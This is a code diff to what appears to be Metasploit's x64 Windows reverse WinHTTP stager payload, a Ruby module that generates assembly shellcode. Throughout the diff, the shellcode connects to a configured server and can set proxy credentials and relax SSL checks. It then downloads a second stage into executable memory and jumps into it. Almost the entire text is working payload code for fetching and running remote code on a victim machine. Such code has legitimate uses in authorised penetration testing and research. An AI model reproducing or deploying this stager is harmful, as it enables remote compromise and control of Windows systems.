@@ -38,7 +38,6 @@ module Payload::Windows::ReverseWinHttp_x64
       conf[:proxy_user]       = datastore['PayloadProxyUser']
       conf[:proxy_pass]       = datastore['PayloadProxyPass']
       conf[:proxy_type]       = datastore['PayloadProxyType']
-      conf[:retry_count]      = datastore['StagerRetryCount']
     end
 
     generate_reverse_winhttp(conf)
@@ -53,13 +52,12 @@ module Payload::Windows::ReverseWinHttp_x64
   #
   def generate_reverse_winhttp(opts={})
     combined_asm = %Q^
-      cld                             ; Clear the direction flag.
-      and rsp, 0xFFFFFFFFFFFFFFF0     ; Ensure RSP is 16 byte aligned 
-      call start                      ; Call start, this pushes the address of 'api_call'
-                                      ; onto the stack.
+      cld                 ; Clear the direction flag.
+      and rsp, ~0xf       ; Ensure RSP is 16 byte aligned
+      call start          ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
-        pop rbp
+        pop rbp           ; rbp now contains the block API pointer
       #{asm_reverse_winhttp(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
@@ -154,194 +152,173 @@ module Payload::Windows::ReverseWinHttp_x64
     end
 
     asm = %Q^
-      ; Input: RBP must be the address of 'api_call'.
-      ; Clobbers: RAX, RSI, RDI, RSP will also be modified
-
         xor rbx, rbx
-
       load_winhttp:
-        push rbx
-        mov r14, 'winhttp'            ; prepare the string 'winhttp'
-        push r14
-        mov rcx, rsp                  ; point to the string
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-        call rbp                      ; Call LoadLibraryA("winhttp")
-      ^
+        push rbx                      ; stack alignment
+        mov r14, 'winhttp'
+        push r14                      ; Push 'winhttp',0 onto the stack
+        mov rcx, rsp                  ; lpFileName (stackpointer)
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
+        call rbp
+    ^
 
     if verify_ssl
       asm << %Q^
       load_crypt32:
-        push rbx
-        mov r14, 'crypt32'            ; prepare the string 'crypt32'
-        push r14
-        mov rcx, rsp                  ; point to the string
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-        call rbp                      ; Call LoadLibraryA("crypt32")
+        push rbx                      ; stack alignment
+        mov r14, 'crypt32'
+        push r14                      ; Push 'crypt32',0 onto the stack
+        mov rcx, rsp                  ; lpFileName (stackpointer)
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')} ; LoadLibraryA
+        call rbp
       ^
     end
 
     asm << %Q^
-      WinHttpOpen:
+      winhttpopen:
+        push rbx                      ; stack alignment
+        push rbx                      ; NULL pointer
+        mov rcx, rsp                  ; pwszAgent ("")
     ^
 
     if proxy_enabled
       asm << %Q^
-      call get_proxy_server
-        db #{proxy_info}
-      get_proxy_server:
-        pop r8                        ; stack pointer (lpszProxyName)
-        push 3                        ; WINHTTP_ACCESS_TYPE_NAMED_PROXY 3 (dwAccessType)
-        pop rdx
+        push 3
+        pop rdx                       ; dwAccessType (3=WINHTTP_ACCESS_TYPE_NAMED_PROXY)
+        call load_proxy_name
+        db #{proxy_info}              ; proxy information
+      load_proxy_name:
+        pop r8                        ; pwszProxyName (stack pointer)
       ^
     else
       asm << %Q^
-        xor r8, r8                    ; NULL (lpszProxyName)
-        ; the push/pop sequence saves a byte over XOR
-        push rbx                      ; push 0
-        pop rdx                       ; WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 0 (dwAccesType)
+        push rbx
+        pop rdx                       ; dwAccessType (0=WINHTTP_ACCESS_TYPE_DEFAULT_PROXY)
+        xor r8, r8                    ; pwszProxyName (NULL)
       ^
     end
 
     asm << %Q^
-        xor r9, r9                    ; NULL (lpszProxyBypass)
-        push rbx                      ; 0 for alignment
-        mov rcx, rsp                  ; Pointer to empty string ("")
-        push rbx                      ; NULL (lpszProxyBypass)
-        push rbx                      ; 0 (dwFlags)
-        push rbx                      ; 0 for alignment
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
-        call rbp                      ; Call WinHttpOpen(...)
+        xor r9, r9                    ; pwszProxyBypass (NULL)
+        push rbx                      ; stack alignment
+        push rbx                      ; dwFlags (0)
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}; WinHttpOpen
+        call rbp
 
-      WinHttpConnect:
-        call get_server_host
+        call load_server_host
         db #{encoded_host}
-      get_server_host:
-        pop rdx                       ; Stack pointer (pswzServerName)
+      load_server_host:
+        pop rdx                       ; pwszServerName
         mov rcx, rax                  ; hSession
         mov r8, #{opts[:port]}        ; nServerPort
-        ; r9 should still be 0 after the previous call, so we don't need
-        ; to clear it again
-        xor r9, r9                    ; 0 (dwReserved)
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
+        xor r9, r9                    ; dwReserved
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')} ; WinHttpConnect
         call rbp
 
-      WinHttpOpenRequest:
-        call get_server_uri
+        call winhttpopenrequest
         db #{encoded_url}
-      get_server_uri:
-        pop r8                        ; Stack pointer (pwszObjectName)
-        xor r9, r9                    ; NULL (pwszVersion)
-        push rbx                      ; 0 for alignment
-        ; the push/pop sequence saves a byte over XOR
-        push rbx                      ; push 0
-        pop rdx                       ; NULL (pwszVerb - defaults to GET)
-        mov rcx, rax                  ; returned by WinHttpConnect (hConnect)
-        push 0x#{http_open_flags.to_s(16)} ; (dwFlags)
-        push rbx                      ; NULL (ppwszAcceptTypes)
-        push rbx                      ; NULL (pwszReferer)
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
+      winhttpopenrequest:
+        mov rcx, rax                  ; hConnect
+        push rbx
+        pop rdx                       ; pwszVerb (NULL=GET)
+        pop r8                        ; pwszObjectName (URI)
+        xor r9, r9                    ; pwszVersion (NULL)
+        push rbx                      ; stack alignment
+        mov rax, #{"0x%.8x" % http_open_flags}  ; dwFlags
+        push rax
+        push rbx                      ; lppwszAcceptType (NULL)
+        push rbx                      ; pwszReferer (NULL)
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')} ; WinHttpOpenRequest
         call rbp
-        xchg rsi, rax                 ; save HttpRequest handle in rsi
-      ^
+
+      prepare:
+        mov rsi, rax                  ; Store hConnection in rsi
+    ^
 
     if proxy_enabled && proxy_user
       asm << %Q^
-      set_up_proxy_config:
-        push rbx               ; pAuthParams (NULL)
-      ^
-
-      if proxy_pass
-        asm << %Q^
-        call got_proxy_pass    ; put proxy_pass on the stack
-      proxy_pass:
-        db #{proxy_pass}
-      got_proxy_pass:
-                               ; pwszPassword now on the stack
-        ^
-      else
-        asm << %Q^
-        push rbx               ; pwszPassword (NULL)
-        ^
-      end
-
-      asm << %Q^
-        call got_proxy_user           ; put proxy user on the stack
-      proxy_user:
+        call load_proxy_user          ; puts proxy_user pointer on stack
         db #{proxy_user}
-      got_proxy_user:
-        pop r9                        ; Get proxy user (pwszUserName)
-        ; the push/pop sequence saves a byte over XOR
-        push rbx                      ; push 0
-        pop rdx                       ; rdx is now 0
-        inc edx                       ; WINHTTP_AUTH_TARGET_PROXY = 1 (dwAuthSceme)
-        mov r8, rdx                   ; WINHTTP_AUTH_SCHEME_BASIC = 1 (dwAuthTargets)
-        mov rcx, rsi                  ; Request handle (hRequest)
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
+      load_proxy_user:
+        pop r8                        ; lpBuffer (stack pointer)
+        mov rcx, rsi                  ; hConnection (connection handle)
+        mov rdx, 0x1002               ; (0x1002=WINHTTP_OPTION_PROXY_USERNAME)
+        push #{proxy_user.length}     ; dwBufferLength (proxy_user length)
+        pop r9
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
         call rbp
+      ^
+    end
+
+    if proxy_enabled && proxy_pass
+      asm << %Q^
+        call load_proxy_pass          ; puts proxy_pass pointer on stack
+        db #{proxy_pass}
+      load_proxy_pass:
+        pop r8                        ; lpBuffer (stack pointer)
+        mov rcx, rsi                  ; hConnection (connection handle)
+        mov rdx, 0x1003               ; (0x1003=WINHTTP_OPTION_PROXY_PASSWORD)
+        push #{proxy_pass.length}     ; dwBufferLength (proxy_pass length)
+        pop r9
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
+        call rbp
+      ^
+    end
+
+    if retry_count > 1
+      asm << %Q^
+        push #{retry_count}
+        pop rdi
+
+      retryrequest:
       ^
     end
 
     if opts[:ssl]
       asm << %Q^
-      set_security_options:
-        mov rcx, rsi                  ; Handle for request (hConnect)
+      winhttpsetoption_ssl:
+        mov rcx, rsi                  ; hRequest (request handle)
         push 31
-        pop rdx                       ; WINHTTP_OPTION_SECURITY_FLAGS (dwOption)
-        push 0x#{secure_flags.to_s(16)}
-        mov r8, rsp                   ; Pointer to flags (lpBuffer)
+        pop rdx                       ; dwOption (31=WINHTTP_OPTION_SECURITY_FLAGS)
+        push rdx                      ; stack alignment
+        push #{"0x%.8x" % secure_flags}  ; flags
+        mov r8, rsp                   ; lpBuffer (pointer to flags)
         push 4
-        pop r9                        ; 4 (dwBufferLength)
-        push rbx                      ; 0 for alignment
-        push rbx                      ; 0 for alignment
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
+        pop r9                        ; dwBufferLength (4 = size of flags)
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')} ; WinHttpSetOption
         call rbp
-        test eax, eax                 ; use eax, it's 1 byte less than rax
-        jz failure
-        ; more alignment require as a result of this call. I have no idea why.
-        push rbx                      ; 0 for alignment
-        push rbx                      ; 0 for alignment
       ^
     end
 
     asm << %Q^
-      ; Store our retry counter in the rdi register
-      set_retry:
-        push #{retry_count}
-        pop rdi
-
-      send_request:
-
-      WinHttpSendRequest:
-        mov rcx, rsi                  ; Request handle (hRequest)
-        ; the push/pop sequence saves a byte over XOR
-        push rbx                      ; push 0
-        pop rdx                       ; NULL (pwszHeaders)
-        xor r8, r8                    ; 0 (dwHeadersLength)
-        xor r9, r9                    ; NULL (lpOptional)
-        push rbx                      ; push 0 (dwContext)
-        push rbx                      ; push 0 (dwTotalLength)
-        push rbx                      ; push 0 (dwOptionalLength)
+      winhttpsendrequest:
+        mov rcx, rsi                  ; hRequest (request handle)
+        push rbx
+        pop rdx                       ; lpszHeaders (NULL)
+        xor r8, r8                    ; dwHeadersLen (0)
+        xor r9, r9                    ; lpszVersion (NULL)
+        push rbx                      ; stack alignment
+        push rbx                      ; dwContext (0)
+        push rbx                      ; dwTotalLength (0)
+        push rbx                      ; dwOptionalLength (0)
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')} ; WinHttpSendRequest
+        call rbp
+        test eax, eax
+        jnz handle_response
     ^
 
-    # required extra alignment for non-ssl payloads. Still don't know why.
-    unless opts[:ssl]
+    if retry_count > 1
       asm << %Q^
-        push rbx                      ; 0 for alignment
+      try_it_again:
+        dec rdi
+        jz failure
+        jmp retryrequest
+      ^
+    else
+      asm << %Q^
+        jmp failure
       ^
     end
-
-    asm << %Q^
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
-        call rbp
-        test eax, eax                 ; use eax, it's 1 byte less than rax
-        jnz check_response            ; if TRUE call WinHttpReceiveResponse API
-
-      try_it_again:
-        dec edi                       ; use edi, it's 1 byte less than rdi
-        jnz send_request
-
-      ; if we didn't allocate before running out of retries, fall through
-    ^
 
     if opts[:exitfunk]
       asm << %Q^
@@ -351,17 +328,23 @@ module Payload::Windows::ReverseWinHttp_x64
     else
       asm << %Q^
       failure:
-        push 0x56A2B5F0        ; hardcoded to exitprocess for size
-        call rbp
+        ; hard-coded to ExitProcess(whatever) for size
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        call rbp                      ; ExitProcess(whatever)
       ^
     end
 
-    # Jump target if the request was sent successfully
     asm << %Q^
-      check_response:
+      handle_response:
+        mov rcx, rsi                  ; hRequest
+        push rbx
+        pop rdx                       ; lpReserved (NULL)
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')} ; WinHttpReceiveResponse
+        call rbp
+        test eax, eax                 ; make sure the request succeeds
+        jz failure
     ^
 
-    # Verify the SSL certificate hash
     if verify_ssl
       asm << %Q^
       ssl_cert_get_context:
@@ -373,9 +356,9 @@ module Payload::Windows::ReverseWinHttp_x64
         ; so we won't worry about doing it, it'll save us bytes!
         mov r8, rsp                   ; Stack pointer (lpBuffer)
         mov r14, r8                   ; Back the stack pointer up for later use
+        push rbx                      ; 0 for alignment
         push 8                        ; One whole pointer
         mov r9, rsp                   ; Stack pointer (lpdwBufferLength)
-        push rbx                      ; 0 for alignment
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
         call rbp
         test eax, eax                 ; use eax instead of rax, saves a byte
@@ -399,7 +382,6 @@ module Payload::Windows::ReverseWinHttp_x64
       ssl_cert_start_verify:
         call ssl_cert_compare_hashes
         db #{encoded_cert_hash}
-
       ssl_cert_compare_hashes:
         pop rax                       ; get the expected hash
         xchg rax, rsi                 ; swap hash and handle for now
@@ -414,59 +396,45 @@ module Payload::Windows::ReverseWinHttp_x64
     end
 
     asm << %Q^
-      receive_response:
-                                      ; The API WinHttpReceiveResponse needs to be called
-                                      ; first to get a valid handle for WinHttpReadData
-        mov rcx, rsi                  ; Handle to the request (hRequest)
-        ; the push/pop sequence saves a byte over XOR
-        push rbx                      ; push 0
-        pop rdx                       ; NULL (lpReserved)
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
-        call rbp
-        test eax, eax                 ; use eax instead of rax, saves a byte
-        jz failure
-
       allocate_memory:
-        ; the push/pop sequence saves a byte over XOR
-        push rbx                      ; push 0
-        pop rcx                       ; NULL (lpAddress)
-        ; rdx should already be zero, so we can save two bytes by using edx here
-        mov edx, 0x00400000           ; 4mb for stage (dwSize)
-        mov r8, 0x1000                ; MEM_COMMIT (flAllocationType)
-        push 0x40                     ; PAGE_EXECUTE_READWRITE
-        pop r9                        ; (flProtect)
-        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
-        call rbp                      ; Call VirtualAlloc(...);
+        push rbx
+        pop rcx                       ; lpAddress (NULL)
+        push 0x40
+        pop rdx
+        mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
+        shl edx, 16                   ; dwSize
+        mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')} ; VirtualAlloc
+        call rbp
 
       download_prep:
-        xchg rax, rbx                 ; place the allocated base address in rbx
-        push rbx                      ; store a copy of the stage base address on the stack
-        push rbx                      ; temporary storage for bytes read count
-        mov rdi, rsp                  ; &bytesRead
+        xchg rax, rbx                 ; store the allocated base in rbx
+        push rbx                      ; store a copy for later
+        push rbx                      ; temp storage for byte count
+        mov rdi, rsp                  ; rdi is the &bytesRead
 
       download_more:
-        mov rcx, rsi                  ; Handle to the request (hFile)
-        mov rdx, rbx                  ; Buffer pointer (lpBuffer)
-        mov r8, 8192                  ; Size (dwNumberOfBytesToRead)
-        mov r9, rdi                   ; Size received (lpNumberOfBytesRead)
-        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
+        mov rcx, rsi                  ; hRequest (request handle)
+        mov rdx, rbx                  ; lpBuffer (pointer to mem)
+        mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
+        mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
+        mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')} ; WinHttpReadData
         call rbp
         add rsp, 32                   ; clean up reserved space
 
-        test eax, eax                 ; use eax instead of rax, saves a byte
+        test eax, eax                 ; did the download fail?
         jz failure
 
-        mov ax, word ptr [rdi]        ; load the bytes read
-        ; Use eax/ebx here, saves a byte. Don't need higher order bytes.
-        add ebx, eax                  ; buffer += bytes_received
+        mov ax, word ptr [rdi]        ; extract the read byte count
+        add rbx, rax                  ; buffer += bytes read
 
-        test eax, eax                 ; use eax instead of rax, saves a byte
-        jnz download_more             ; continue until it returns 0
-        pop rax                       ; clear the temporary storage
-        pop rax                       ; clear the temporary storage
+        test eax, eax                 ; are we done?
+        jnz download_more             ; keep going
+        pop rax                       ; clear up reserved space
+        pop rax                       ; realign again
 
       execute_stage:
-        ret                    ; dive into the stored stage address
+        ret                           ; return to the stored stage address
     ^
 
     if opts[:exitfunk]
